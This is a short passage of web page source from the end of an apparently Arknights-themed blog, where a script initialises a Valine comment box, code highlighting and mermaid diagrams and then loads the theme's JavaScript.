class="pjax-js">reset=_=>{new Valine({
 el: '#Valine'
 , appId: 'fvW1eWgLvTdXfECCW1Bu9g6J-gzGzoHsz'
 , appKey: 'stD8FmxHNFFxhkzXholoBHdq' , placeholder: '此条评论委托企鹅物流发送'
});code.findCode();mermaid.init(undefined, ('.mermaid'));}</script><script src="/js/arknights.js"></script><script>window.addEventListener("load",()=>{reset()})</script></body></html>